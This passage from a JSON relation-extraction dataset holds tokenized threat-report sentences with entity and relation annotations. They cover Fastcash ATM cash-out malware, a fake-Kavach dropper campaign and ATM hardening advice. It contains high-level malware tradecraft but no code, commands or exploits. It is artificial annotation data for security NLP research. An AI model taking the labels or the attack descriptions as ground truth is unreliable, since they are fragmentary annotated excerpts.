"global_pos": [117, 117], "name": "malware", "pos": [11, 12], "index": "13_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [129, 129], "name": "responses", "pos": [23, 24], "index": "14_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [153, 153], "name": "list", "pos": [2, 3], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [166, 166], "name": "malware", "pos": [15, 16], "index": "16_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "IJ", "evidence": [2], "h": 4, "t": 5}, {"r": "RD", "evidence": [2, 3, 4, 5], "h": 2, "t": 14}, {"r": "CO", "evidence": [2], "h": 2, "t": 4}, {"r": "CO", "evidence": [2], "h": 2, "t": 3}, {"r": "CO", "evidence": [2, 3], "h": 2, "t": 6}, {"r": "CO", "evidence": [2, 3, 4], "h": 2, "t": 12}, {"r": "CO", "evidence": [2, 3, 4], "h": 2, "t": 10}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 2, "t": 13}, {"r": "EX", "evidence": [3], "h": 6, "t": 7}, {"r": "RD", "evidence": [3], "h": 6, "t": 8}, {"r": "RD", "evidence": [3, 4], "t": 8, "h": 9}, {"r": "RD", "evidence": [3, 4], "t": 8, "h": 9}, {"r": "WR", "evidence": [3, 4], "t": 8, "h": 9}, {"r": "RD", "evidence": [4, 5], "h": 9, "t": 14}, {"r": "RD", "evidence": [4, 5], "h": 11, "t": 14}, {"r": "WR", "evidence": [4, 5], "h": 11, "t": 14}, {"r": "CO", "evidence": [4], "h": 9, "t": 11}, {"r": "WR", "evidence": [5], "h": 13, "t": 14}, {"r": "UK", "evidence": [5, 6], "h": 13, "t": 16}, {"r": "CO", "evidence": [5, 6], "h": 14, "t": 15}]}, {"title": "651-15", "sents": [["Main", "Alice", "UI", "window", "."], ["Fastcash", "consists", "of", "a", "process", "injector", "and", "shared", "objects", "presumably", "injected", "into", "the", "process", "space", "of", "compromised", "bank", "payment", "authorization", "systems", "."], ["The", "malware", "monitors", "ISO8583-based", "transactions", "using", "code", "from", "a", "fairly", "old", "open-source", "library", "for", "parsing", "ISO8583", "packets", "."], ["If", "an", "ATM", "transaction", "contains", "the", "attackers", "'", "codes", ",", "the", "data", "will", "not", "be", "forwarded", "to", "the", "original", "payment", "authorisation", "application", "and", "the", "transaction", "approval", "will", "be", "sent", "back", "to", "the", "target", "ATM", "system", "allowing", "attackers", "to", "dispense", "cash", "."], ["This", "mode", "of", "operation", "is", "similar", "to", "some", "rootkits", ",", "where", "malware", "attempts", "to", "hide", "its", "presence", "on", "the", "system", "by", "modifying", "the", "responses", "sent", "back", "from", "the", "operating", "system", "to", "the", "application", "that", "attempts", "to", "list", "system", "objects", "such", "as", "files", "or", "processes", "."], ["The", "returned", "list", "is", "usually", "modified", "to", "remove", "names", "of", "processes", "that", "belong", "to", "the", "malware", "."], ["In", "our", "case", ",", "the", "clustering", "was", "conducted", "by", "extracting", "the", "following", "attributes", "of", "each", "sample", ":", "Strings", "extracted", "from", "the", "fileDisassembled", "code", "from", "the", "entry", "point", "of", "the", "fileFile", "entropy", "and", "the", "presence", "of", "a", "known", "packerImported", "or", "exported", "functionsEmbedded", "resourcesAfter", "collecting", "the", "attributes", "from", "each", "sample", ",", "Jaccard", "distance", "is", "calculated", "for", "every", "pair", "of", "the", "files", "in", "the", "set", "."], ["Disable", "Windows", "AutoPlay", "and", "configure", "BIOS", "to", "disable", "the", "ability", "to", "boot", "software", "from", "USB", "sticks", "and", "CD/DVD", "drives", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [5, 5], "name": "Fastcash", "pos": [0, 1], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [9, 9], "name": "process injector", "pos": [4, 6], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [12, 12], "name": "shared objects", "pos": [7, 9], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [22, 22], "name": "bank", "pos": [17, 18], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [28, 28], "name": "malware", "pos": [1, 2], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [33, 33], "name": "code", "pos": [6, 7], "index": "5_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [42, 42], "name": "ISO8583 packets", "pos": [15, 17], "index": "6_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [47, 47], "name": "ATM", "pos": [2, 3], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [51, 51], "name": "attackers", "pos": [6, 7], "index": "8_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [78, 78], "name": "ATM", "pos": [33, 34], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [81, 81], "name": "attackers", "pos": [36, 37], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [97, 97], "name": "malware", "pos": [11, 12], "index": "11_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [109, 109], "name": "responses", "pos": [23, 24], "index": "12_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [133, 133], "name": "list", "pos": [2, 3], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [146, 146], "name": "malware", "pos": [15, 16], "index": "14_0"}]], "labels": [{"r": "IJ", "evidence": [1], "h": 2, "t": 3}, {"r": "RD", "evidence": [1, 2, 3, 4], "h": 0, "t": 12}, {"r": "CO", "evidence": [1], "h": 0, "t": 2}, {"r": "CO", "evidence": [1], "h": 0, "t": 1}, {"r": "CO", "evidence": [1, 2], "h": 0, "t": 4}, {"r": "CO", "evidence": [1, 2, 3], "h": 0, "t": 10}, {"r": "CO", "evidence": [1, 2, 3], "h": 0, "t": 8}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 0, "t": 11}, {"r": "EX", "evidence": [2], "h": 4, "t": 5}, {"r": "RD", "evidence": [2], "h": 4, "t": 6}, {"r": "RD", "evidence": [2, 3], "t": 6, "h": 7}, {"r": "RD", "evidence": [2, 3], "t": 6, "h": 7}, {"r": "WR", "evidence": [2, 3], "t": 6, "h": 7}, {"r": "RD", "evidence": [3, 4], "h": 7, "t": 12}, {"r": "RD", "evidence": [3, 4], "h": 9, "t": 12}, {"r": "WR", "evidence": [3, 4], "h": 9, "t": 12}, {"r": "CO", "evidence": [3], "h": 7, "t": 9}, {"r": "WR", "evidence": [4], "h": 11, "t": 12}, {"r": "UK", "evidence": [4, 5], "h": 11, "t": 14}, {"r": "CO", "evidence": [4, 5], "h": 12, "t": 13}]}, {"title": "651-16", "sents": [["Fastcash", "consists", "of", "a", "process", "injector", "and", "shared", "objects", "presumably", "injected", "into", "the", "process", "space", "of", "compromised", "bank", "payment", "authorization", "systems", "."], ["The", "malware", "monitors", "ISO8583-based", "transactions", "using", "code", "from", "a", "fairly", "old", "open-source", "library", "for", "parsing", "ISO8583", "packets", "."], ["If", "an", "ATM", "transaction", "contains", "the", "attackers", "'", "codes", ",", "the", "data", "will", "not", "be", "forwarded", "to", "the", "original", "payment", "authorisation", "application", "and", "the", "transaction", "approval", "will", "be", "sent", "back", "to", "the", "target", "ATM", "system", "allowing", "attackers", "to", "dispense", "cash", "."], ["This", "mode", "of", "operation", "is", "similar", "to", "some", "rootkits", ",", "where", "malware", "attempts", "to", "hide", "its", "presence", "on", "the", "system", "by", "modifying", "the", "responses", "sent", "back", "from", "the", "operating", "system", "to", "the", "application", "that", "attempts", "to", "list", "system", "objects", "such", "as", "files", "or", "processes", "."], ["The", "returned", "list", "is", "usually", "modified", "to", "remove", "names", "of", "processes", "that", "belong", "to", "the", "malware", "."], ["In", "our", "case", ",", "the", "clustering", "was", "conducted", "by", "extracting", "the", "following", "attributes", "of", "each", "sample", ":", "Strings", "extracted", "from", "the", "fileDisassembled", "code", "from", "the", "entry", "point", "of", "the", "fileFile", "entropy", "and", "the", "presence", "of", "a", "known", "packerImported", "or", "exported", "functionsEmbedded", "resourcesAfter", "collecting", "the", "attributes", "from", "each", "sample", ",", "Jaccard", "distance", "is", "calculated", "for", "every", "pair", "of", "the", "files", "in", "the", "set", "."], ["Disable", "Windows", "AutoPlay", "and", "configure", "BIOS", "to", "disable", "the", "ability", "to", "boot", "software", "from", "USB", "sticks", "and", "CD/DVD", "drives", "."], ["Set", "strong", "BIOS", "password", "protection", "to", "prevent", "boot", "settings", "from", "being", "changed", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Fastcash", "pos": [0, 1], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "process injector", "pos": [4, 6], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "shared objects", "pos": [7, 9], "index": "2_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [17, 17], "name": "bank", "pos": [17, 18], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "malware", "pos": [1, 2], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "code", "pos": [6, 7], "index": "5_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [37, 37], "name": "ISO8583 packets", "pos": [15, 17], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [42, 42], "name": "ATM", "pos": [2, 3], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [46, 46], "name": "attackers", "pos": [6, 7], "index": "8_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [73, 73], "name": "ATM", "pos": [33, 34], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [76, 76], "name": "attackers", "pos": [36, 37], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [92, 92], "name": "malware", "pos": [11, 12], "index": "11_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [104, 104], "name": "responses", "pos": [23, 24], "index": "12_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [128, 128], "name": "list", "pos": [2, 3], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [141, 141], "name": "malware", "pos": [15, 16], "index": "14_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [229, 229], "name": "password", "pos": [3, 4], "index": "15_0"}]], "labels": [{"r": "IJ", "evidence": [0], "h": 2, "t": 3}, {"r": "RD", "evidence": [0, 1, 2, 3], "h": 0, "t": 12}, {"r": "CO", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 10}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 8}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 11}, {"r": "EX", "evidence": [1], "h": 4, "t": 5}, {"r": "RD", "evidence": [1], "h": 4, "t": 6}, {"r": "RD", "evidence": [1, 2], "t": 6, "h": 7}, {"r": "RD", "evidence": [1, 2], "t": 6, "h": 7}, {"r": "WR", "evidence": [1, 2], "t": 6, "h": 7}, {"r": "RD", "evidence": [2, 3], "h": 7, "t": 12}, {"r": "RD", "evidence": [2, 3], "h": 9, "t": 12}, {"r": "WR", "evidence": [2, 3], "h": 9, "t": 12}, {"r": "CO", "evidence": [2], "h": 7, "t": 9}, {"r": "WR", "evidence": [3], "h": 11, "t": 12}, {"r": "UK", "evidence": [3, 4], "h": 11, "t": 14}, {"r": "CO", "evidence": [3, 4], "h": 12, "t": 13}]}, {"title": "651-17", "sents": [["The", "malware", "monitors", "ISO8583-based", "transactions", "using", "code", "from", "a", "fairly", "old", "open-source", "library", "for", "parsing", "ISO8583", "packets", "."], ["If", "an", "ATM", "transaction", "contains", "the", "attackers", "'", "codes", ",", "the", "data", "will", "not", "be", "forwarded", "to", "the", "original", "payment", "authorisation", "application", "and", "the", "transaction", "approval", "will", "be", "sent", "back", "to", "the", "target", "ATM", "system", "allowing", "attackers", "to", "dispense", "cash", "."], ["This", "mode", "of", "operation", "is", "similar", "to", "some", "rootkits", ",", "where", "malware", "attempts", "to", "hide", "its", "presence", "on", "the", "system", "by", "modifying", "the", "responses", "sent", "back", "from", "the", "operating", "system", "to", "the", "application", "that", "attempts", "to", "list", "system", "objects", "such", "as", "files", "or", "processes", "."], ["The", "returned", "list", "is", "usually", "modified", "to", "remove", "names", "of", "processes", "that", "belong", "to", "the", "malware", "."], ["In", "our", "case", ",", "the", "clustering", "was", "conducted", "by", "extracting", "the", "following", "attributes", "of", "each", "sample", ":", "Strings", "extracted", "from", "the", "fileDisassembled", "code", "from", "the", "entry", "point", "of", "the", "fileFile", "entropy", "and", "the", "presence", "of", "a", "known", "packerImported", "or", "exported", "functionsEmbedded", "resourcesAfter", "collecting", "the", "attributes", "from", "each", "sample", ",", "Jaccard", "distance", "is", "calculated", "for", "every", "pair", "of", "the", "files", "in", "the", "set", "."], ["Disable", "Windows", "AutoPlay", "and", "configure", "BIOS", "to", "disable", "the", "ability", "to", "boot", "software", "from", "USB", "sticks", "and", "CD/DVD", "drives", "."], ["Set", "strong", "BIOS", "password", "protection", "to", "prevent", "boot", "settings", "from", "being", "changed", "."], ["Disable", "access", "to", "the", "Windows", "desktop", "at", "the", "ATM", ",", "ensure", "RDP", "sessions", "are", "secured", "with", "multiple", "authentication", "factors", "such", "as", "Duo", "Authentication", "for", "Windows", "Logon", "and", "RDP", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "malware", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "code", "pos": [6, 7], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [15, 15], "name": "ISO8583 packets", "pos": [15, 17], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [20, 20], "name": "ATM", "pos": [2, 3], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [24, 24], "name": "attackers", "pos": [6, 7], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [51, 51], "name": "ATM", "pos": [33, 34], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [54, 54], "name": "attackers", "pos": [36, 37], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [70, 70], "name": "malware", "pos": [11, 12], "index": "7_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [82, 82], "name": "responses", "pos": [23, 24], "index": "8_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [106, 106], "name": "list", "pos": [2, 3], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [119, 119], "name": "malware", "pos": [15, 16], "index": "10_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [207, 207], "name": "password", "pos": [3, 4], "index": "11_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [225, 225], "name": "ATM", "pos": [8, 9], "index": "12_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "RD", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "WR", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "RD", "evidence": [1, 2], "h": 3, "t": 8}, {"r": "RD", "evidence": [1, 2], "h": 5, "t": 8}, {"r": "WR", "evidence": [1, 2], "h": 5, "t": 8}, {"r": "CO", "evidence": [1], "h": 3, "t": 5}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "UK", "evidence": [2, 3], "h": 7, "t": 10}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 9}]}, {"title": "651-18", "sents": [["If", "an", "ATM", "transaction", "contains", "the", "attackers", "'", "codes", ",", "the", "data", "will", "not", "be", "forwarded", "to", "the", "original", "payment", "authorisation", "application", "and", "the", "transaction", "approval", "will", "be", "sent", "back", "to", "the", "target", "ATM", "system", "allowing", "attackers", "to", "dispense", "cash", "."], ["This", "mode", "of", "operation", "is", "similar", "to", "some", "rootkits", ",", "where", "malware", "attempts", "to", "hide", "its", "presence", "on", "the", "system", "by", "modifying", "the", "responses", "sent", "back", "from", "the", "operating", "system", "to", "the", "application", "that", "attempts", "to", "list", "system", "objects", "such", "as", "files", "or", "processes", "."], ["The", "returned", "list", "is", "usually", "modified", "to", "remove", "names", "of", "processes", "that", "belong", "to", "the", "malware", "."], ["In", "our", "case", ",", "the", "clustering", "was", "conducted", "by", "extracting", "the", "following", "attributes", "of", "each", "sample", ":", "Strings", "extracted", "from", "the", "fileDisassembled", "code", "from", "the", "entry", "point", "of", "the", "fileFile", "entropy", "and", "the", "presence", "of", "a", "known", "packerImported", "or", "exported", "functionsEmbedded", "resourcesAfter", "collecting", "the", "attributes", "from", "each", "sample", ",", "Jaccard", "distance", "is", "calculated", "for", "every", "pair", "of", "the", "files", "in", "the", "set", "."], ["Disable", "Windows", "AutoPlay", "and", "configure", "BIOS", "to", "disable", "the", "ability", "to", "boot", "software", "from", "USB", "sticks", "and", "CD/DVD", "drives", "."], ["Set", "strong", "BIOS", "password", "protection", "to", "prevent", "boot", "settings", "from", "being", "changed", "."], ["Disable", "access", "to", "the", "Windows", "desktop", "at", "the", "ATM", ",", "ensure", "RDP", "sessions", "are", "secured", "with", "multiple", "authentication", "factors", "such", "as", "Duo", "Authentication", "for", "Windows", "Logon", "and", "RDP", "."], ["Remove", "any", "unused", "services", "and", "applications", "from", "the", "system", "to", "reduce", "the", "attack", "surface", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [2, 2], "name": "ATM", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "attackers", "pos": [6, 7], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [33, 33], "name": "ATM", "pos": [33, 34], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [36, 36], "name": "attackers", "pos": [36, 37], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [52, 52], "name": "malware", "pos": [11, 12], "index": "4_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [64, 64], "name": "responses", "pos": [23, 24], "index": "5_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [88, 88], "name": "list", "pos": [2, 3], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [101, 101], "name": "malware", "pos": [15, 16], "index": "7_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [189, 189], "name": "password", "pos": [3, 4], "index": "8_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [207, 207], "name": "ATM", "pos": [8, 9], "index": "9_0"}]], "labels": [{"r": "RD", "evidence": [0, 1], "h": 0, "t": 5}, {"r": "RD", "evidence": [0, 1], "h": 2, "t": 5}, {"r": "WR", "evidence": [0, 1], "h": 2, "t": 5}, {"r": "CO", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "UK", "evidence": [1, 2], "h": 4, "t": 7}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 6}]}, {"title": "651-19", "sents": [["This", "mode", "of", "operation", "is", "similar", "to", "some", "rootkits", ",", "where", "malware", "attempts", "to", "hide", "its", "presence", "on", "the", "system", "by", "modifying", "the", "responses", "sent", "back", "from", "the", "operating", "system", "to", "the", "application", "that", "attempts", "to", "list", "system", "objects", "such", "as", "files", "or", "processes", "."], ["The", "returned", "list", "is", "usually", "modified", "to", "remove", "names", "of", "processes", "that", "belong", "to", "the", "malware", "."], ["In", "our", "case", ",", "the", "clustering", "was", "conducted", "by", "extracting", "the", "following", "attributes", "of", "each", "sample", ":", "Strings", "extracted", "from", "the", "fileDisassembled", "code", "from", "the", "entry", "point", "of", "the", "fileFile", "entropy", "and", "the", "presence", "of", "a", "known", "packerImported", "or", "exported", "functionsEmbedded", "resourcesAfter", "collecting", "the", "attributes", "from", "each", "sample", ",", "Jaccard", "distance", "is", "calculated", "for", "every", "pair", "of", "the", "files", "in", "the", "set", "."], ["Disable", "Windows", "AutoPlay", "and", "configure", "BIOS", "to", "disable", "the", "ability", "to", "boot", "software", "from", "USB", "sticks", "and", "CD/DVD", "drives", "."], ["Set", "strong", "BIOS", "password", "protection", "to", "prevent", "boot", "settings", "from", "being", "changed", "."], ["Disable", "access", "to", "the", "Windows", "desktop", "at", "the", "ATM", ",", "ensure", "RDP", "sessions", "are", "secured", "with", "multiple", "authentication", "factors", "such", "as", "Duo", "Authentication", "for", "Windows", "Logon", "and", "RDP", "."], ["Remove", "any", "unused", "services", "and", "applications", "from", "the", "system", "to", "reduce", "the", "attack", "surface", "."], ["Implement", "other", "measures", "to", "harden", "the", "underlying", "ATM", "operating", "system", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [11, 11], "name": "malware", "pos": [11, 12], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [23, 23], "name": "responses", "pos": [23, 24], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [47, 47], "name": "list", "pos": [2, 3], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [60, 60], "name": "malware", "pos": [15, 16], "index": "3_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [148, 148], "name": "password", "pos": [3, 4], "index": "4_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [166, 166], "name": "ATM", "pos": [8, 9], "index": "5_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [209, 209], "name": "ATM", "pos": [7, 8], "index": "6_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "UK", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 2}]}, {"title": "651-20", "sents": [["The", "returned", "list", "is", "usually", "modified", "to", "remove", "names", "of", "processes", "that", "belong", "to", "the", "malware", "."], ["In", "our", "case", ",", "the", "clustering", "was", "conducted", "by", "extracting", "the", "following", "attributes", "of", "each", "sample", ":", "Strings", "extracted", "from", "the", "fileDisassembled", "code", "from", "the", "entry", "point", "of", "the", "fileFile", "entropy", "and", "the", "presence", "of", "a", "known", "packerImported", "or", "exported", "functionsEmbedded", "resourcesAfter", "collecting", "the", "attributes", "from", "each", "sample", ",", "Jaccard", "distance", "is", "calculated", "for", "every", "pair", "of", "the", "files", "in", "the", "set", "."], ["Disable", "Windows", "AutoPlay", "and", "configure", "BIOS", "to", "disable", "the", "ability", "to", "boot", "software", "from", "USB", "sticks", "and", "CD/DVD", "drives", "."], ["Set", "strong", "BIOS", "password", "protection", "to", "prevent", "boot", "settings", "from", "being", "changed", "."], ["Disable", "access", "to", "the", "Windows", "desktop", "at", "the", "ATM", ",", "ensure", "RDP", "sessions", "are", "secured", "with", "multiple", "authentication", "factors", "such", "as", "Duo", "Authentication", "for", "Windows", "Logon", "and", "RDP", "."], ["Remove", "any", "unused", "services", "and", "applications", "from", "the", "system", "to", "reduce", "the", "attack", "surface", "."], ["Implement", "other", "measures", "to", "harden", "the", "underlying", "ATM", "operating", "system", "."], ["Implement", "strong", "encryption", "between", "the", "ATM", "and", "the", "host", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [2, 2], "name": "list", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "malware", "pos": [15, 16], "index": "1_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [103, 103], "name": "password", "pos": [3, 4], "index": "2_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [121, 121], "name": "ATM", "pos": [8, 9], "index": "3_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [164, 164], "name": "ATM", "pos": [7, 8], "index": "4_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [173, 173], "name": "ATM", "pos": [5, 6], "index": "5_0"}]], "labels": []}, {"title": "09-0", "sents": [["The", "droppers", "are", ".NET-based", "executables", "."], ["They", "begin", "execution", "by", "checking", "if", "the", "timezone", "on", "the", "infected", "endpoint", "contains", "keywords", "such", "as", "``", "India", "''", "."], ["A", "splash", "screen", "is", "displayed", "to", "the", "victim", "notifying", "them", "that", "the", "Kavach", "application", "is", "being", "installed", ":"], ["The", "downloaders", "will", "then", "reach", "out", "to", "a", "malicious", "website", ",", "masquerading", "as", "a", "legitimate", "Indian", "government", "or", "pseudo-government", "entity", ",", "to", "download", "a", "malicious", "payload", "that", "is", "then", "activated", "on", "the", "endpoint", "."], ["Next", ",", "download", "a", "legitimate", "copy", "of", "the", "Kavach", "application", "'", "s", "MSI", "installer", "from", "yet", "another", "attacker-controlled", "website", "and", "execute", "it", "to", "make", "the", "whole", "attack", "chain", "appear", "legitimate", "."], ["Downloader", "fetching", "and", "executing", "malicious", "payload", "and", "legitimate", "installer", "for", "Kavach", "."], ["Another", "variation", "of", "the", "initial", "infection", "vector", "used", "in", "the", "campaign", "is", "a", "notably", "large", "downloader", "binary", "(", "141MB", ")", "that", "contains", "the", "entire", "legitimate", "installer", "(", "MSI", ")", "for", "the", "Kavach", "application", "in", "its", "resources", "."], ["The", "zipped", "copy", "of", "the", "MSI", "is", "extracted", "from", "the", "downloader", "'", "s", "resources", "and", "executed", "on", "the", "system", "as", "a", "decoy", "to", "appear", "legitimate", "to", "the", "targets", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "droppers", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": ".NET-based", "pos": [3, 4], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [6, 6], "name": "They", "pos": [0, 1], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [16, 16], "name": "infected endpoint", "pos": [10, 12], "index": "3_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [38, 38], "name": "Kavach", "pos": [12, 13], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [45, 45], "name": "downloaders", "pos": [1, 2], "index": "5_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [53, 53], "name": "website", "pos": [9, 10], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [69, 69], "name": "payload", "pos": [25, 26], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [86, 86], "name": "Kavach application ' s MSI installer", "pos": [8, 14], "index": "8_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [96, 96], "name": "website", "pos": [18, 19], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [109, 109], "name": "Downloader", "pos": [0, 1], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [114, 114], "name": "payload", "pos": [5, 6], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [117, 117], "name": "installer for Kavach", "pos": [8, 11], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [136, 136], "name": "downloader binary", "pos": [15, 17], "index": "13_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [148, 148], "name": "MSI", "pos": [27, 28], "index": "14_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [159, 159], "name": "zipped", "pos": [1, 2], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [168, 168], "name": "downloader ' s resources", "pos": [10, 14], "index": "16_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 5}, {"r": "ST", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [0, 1, 2], "t": 1, "h": 4}, {"r": "WR", "evidence": [0, 1, 2], "t": 1, "h": 4}, {"r": "ST", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "RF", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "RF", "evidence": [3], "h": 5, "t": 6}, {"r": "WR", "evidence": [3], "h": 5, "t": 7}, {"r": "EX", "evidence": [3], "h": 5, "t": 7}, {"r": "WR", "evidence": [3, 4], "h": 5, "t": 8}, {"r": "RF", "evidence": [3, 4], "h": 5, "t": 9}, {"r": "FR", "evidence": [3, 4, 5], "h": 5, "t": 10}, {"r": "CO", "evidence": [3, 4, 5], "h": 7, "t": 11}, {"r": "CO", "evidence": [4, 5], "h": 8, "t": 12}, {"r": "EX", "evidence": [5], "h": 10, "t": 11}, {"r": "CD", "evidence": [5], "h": 10, "t": 12}, {"r": "EX", "evidence": [5], "h": 10, "t": 12}, {"r": "WR", "evidence": [5, 6], "h": 10, "t": 13}, {"r": "CO", "evidence": [6, 7], "h": 14, "t": 15}]}, {"title": "09-1", "sents": [["They", "begin", "execution", "by", "checking", "if", "the", "timezone", "on", "the", "infected", "endpoint", "contains", "keywords", "such", "as", "``", "India", "''", "."], ["A", "splash", "screen", "is", "displayed", "to", "the", "victim", "notifying", "them", "that", "the", "Kavach", "application", "is", "being", "installed", ":"], ["The", "downloaders", "will", "then", "reach", "out", "to", "a", "malicious", "website", ",", "masquerading", "as", "a", "legitimate", "Indian", "government", "or", "pseudo-government", "entity", ",", "to", "download", "a", "malicious", "payload", "that", "is", "then", "activated", "on", "the", "endpoint", "."], ["Next", ",", "download", "a", "legitimate", "copy", "of", "the", "Kavach", "application", "'", "s", "MSI", "installer", "from", "yet", "another", "attacker-controlled", "website", "and", "execute", "it", "to", "make", "the", "whole", "attack", "chain", "appear", "legitimate", "."], ["Downloader", "fetching", "and", "executing", "malicious", "payload", "and", "legitimate", "installer", "for", "Kavach", "."], ["Another", "variation", "of", "the", "initial", "infection", "vector", "used", "in", "the", "campaign", "is", "a", "notably", "large", "downloader", "binary", "(", "141MB", ")", 